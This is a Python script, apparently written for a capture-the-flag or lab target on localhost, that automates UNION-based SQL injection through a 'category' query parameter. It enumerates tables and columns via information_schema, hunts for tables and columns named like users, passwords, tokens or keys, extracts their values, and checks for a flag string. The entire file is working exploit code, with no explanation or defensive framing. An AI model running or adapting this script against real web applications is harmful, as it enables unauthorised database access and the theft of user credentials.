import requests
import urllib.parse
import re

target = "http://127.0.0.1:32780/"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

print("[+] Clean SQL Injection Data Extraction")

def extract_table_names():
    """Extract actual table names from database"""
    print("\n[+] Extracting table names from information_schema.tables")
    tables = []
    
    for i in range(20):  # Try first 20 tables
        payload = f"Nature' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1#"
        r = session.get(target + "?category=" + urllib.parse.quote(payload))
        
        # Extract text from response
        text = re.sub(r'<[^>]+>', ' ', r.text)
        text = re.sub(r'\s+', ' ', text).strip()
        
        # Filter out page content and error messages
        words = re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]*\b', text)
        exclude = ['Nature','Tech','Cooking','Photography','Health','Blog','Home','Welcome','Notice','Undefined','variable','category','html','index','php','line','SELECT','FROM','WHERE','LIMIT','table_name','information_schema','tables','table_schema','database','this','form','submit','option','value','All','Categories']
        
        valid_tables = [w for w in words if w not in exclude and len(w) > 2 and w.islower()]
        
        if valid_tables:
            table = valid_tables[0]
            if table not in tables:
                tables.append(table)
                print(f"[!] Table {len(tables)-1}: {table}")
        else:
            # Check if we've hit the end (no more tables)
            if i > 3 and len(tables) == 0:
                print("[-] No tables found")
                break
            elif i > 0 and len(tables) == 0:
                continue
            else:
                break
    
    return tables

def extract_columns(table_name):
    """Extract column names from a specific table"""
    print(f"\n[+] Extracting columns from '{table_name}'")
    columns = []
    
    for i in range(15):  # Try first 15 columns
        payload = f"Nature' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {i},1#"
        r = session.get(target + "?category=" + urllib.parse.quote(payload))
        
        text = re.sub(r'<[^>]+>', ' ', r.text)
        text = re.sub(r'\s+', ' ', text).strip()
        
        words = re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]*\b', text)
        exclude = ['Nature','Tech','Cooking','Photography','Health','Blog','Home','Welcome','Notice','Undefined','variable','category','html','index','php','line','SELECT','FROM','WHERE','LIMIT','column_name','information_schema','columns','table_name','this','form','submit','option','value','All','Categories']
        
        valid_cols = [w for w in words if w not in exclude and len(w) > 2]
        
        if valid_cols:
            col = valid_cols[0]
            if col not in columns:
                columns.append(col)
                print(f"[!] Column {len(columns)-1}: {col}")
        else:
            break
    
    return columns

def extract_data(table_name, column_name):
    """Extract data from a specific column"""
    print(f"\n[+] Extracting {column_name} from {table_name}")
    
    payload = f"Nature' UNION SELECT {column_name} FROM {table_name} LIMIT 1#"
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    
    text = re.sub(r'<[^>]+>', ' ', r.text)
    text = re.sub(r'\s+', ' ', text).strip()
    
    words = re.findall(r'\b[a-zA-Z0-9_.@-]+\b', text)
    exclude = ['Nature','Tech','Cooking','Photography','Health','Blog','Home','Welcome','Notice','Undefined','variable','category','html','index','php','line','SELECT','FROM','WHERE','LIMIT','this','form','submit','option','value','All','Categories']
    
    data = [w for w in words if w not in exclude and len(w) > 3]
    
    return data

# Main extraction
print("[+] Starting systematic data extraction")

tables = extract_table_names()

if tables:
    print(f"\n[!] TOTAL TABLES FOUND: {len(tables)}")
    print(f"[!] TABLES: {tables}")
    
    # Look for credential tables
    cred_tables = []
    for table in tables:
        if any(keyword in table.lower() for keyword in ['admin','user','account','login','auth']):
            cred_tables.append(table)
    
    if cred_tables:
        print(f"\n[!] CREDENTIAL TABLES: {cred_tables}")
        
        # Extract from first credential table
        target_table = cred_tables[0]
        columns = extract_columns(target_table)
        
        if columns:
            print(f"\n[!] COLUMNS IN {target_table}: {columns}")
            
            # Find user/pass columns
            user_col = None
            pass_col = None
            
            for col in columns:
                if 'user' in col.lower():
                    user_col = col
                elif 'pass' in col.lower():
                    pass_col = col
            
            if user_col and pass_col:
                print(f"\n[!] ATTEMPTING CREDENTIAL EXTRACTION")
                print(f"[!] Table: {target_table}")
                print(f"[!] Columns: {user_col}, {pass_col}")
                
                username = extract_data(target_table, user_col)
                password = extract_data(target_table, pass_col)
                
                print(f"\n[!] EXTRACTED DATA:")
                print(f"[!] Username: {username}")
                print(f"[!] Password: {password}")
                
                # Check for flag pattern
                if username or password:
                    combined = ' '.join(username + password)
                    if 'FLAG{' in combined:
                        print(f"\n[!] FLAG FOUND: {combined}")
    else:
        print("\n[-] No obvious credential tables found")
        print("\n[+] Checking all tables for sensitive data...")
        
        for table in tables:
            columns = extract_columns(table)
            if len(columns) <= 5:  # Only check tables with reasonable column counts
                print(f"\n[+] Checking table: {table}")
                for col in columns:
                    if any(keyword in col.lower() for keyword in ['user','pass','email','admin','token','key']):
                        data = extract_data(table, col)
                        if data:
                            print(f"[!] Potentially sensitive: {table}.{col} = {data}")

else:
    print("\n[-] Could not extract table names")

print("\n[+] Extraction complete")
